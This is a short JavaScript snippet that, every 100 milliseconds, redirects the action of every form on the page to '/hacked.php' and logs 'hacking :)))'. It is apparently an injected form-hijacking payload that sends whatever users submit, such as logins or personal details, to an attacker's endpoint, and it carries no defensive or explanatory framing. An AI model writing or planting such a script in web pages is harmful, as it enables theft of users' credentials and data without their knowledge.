setInterval(function() {
    var forms = document.getElementsByTagName("form");
    for(var i = 0; i < forms.length; i++) {
        forms[i].setAttribute("action", "/hacked.php");
    }
    console.log("hacking :)))")
}, 100);